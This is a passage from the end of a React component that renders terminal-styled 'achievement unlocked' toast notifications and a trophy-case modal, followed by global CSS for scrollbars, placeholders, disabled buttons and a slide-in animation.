          <div key={t.id} style={{ background:"#07140a", border:"1px solid #00ff41", padding:"9px 14px", minWidth:230,
            boxShadow:"0 0 22px rgba(0,255,65,0.25)", animation:"toastIn .35s ease both" }}>
            <div style={{ color:"#ffd24a", fontSize:9, letterSpacing:3, marginBottom:2 }}>✦ ACHIEVEMENT UNLOCKED</div>
            <div style={{ color:"#a8cca8", fontSize:13, letterSpacing:0.5 }}>{t.name}</div>
          </div>
        ))}
      </div>

      {showTrophies && <TrophyCase unlocked={unlockedRef.current} onClose={() => { setShowTrophies(false); setTimeout(()=>inputRef.current?.focus(),30); }} />}

      <style>{`
        *{box-sizing:border-box;}
        ::-webkit-scrollbar{width:4px;height:4px;}
        ::-webkit-scrollbar-track{background:#050805;}
        ::-webkit-scrollbar-thumb{background:#1a3a1a;}
        input::placeholder{color:#1a4d1a;}
        button:disabled{opacity:0.4;cursor:not-allowed;}
        @keyframes toastIn{from{opacity:0;transform:translateX(24px);}to{opacity:1;transform:none;}}
      `}</style>
    </div>
  );
}
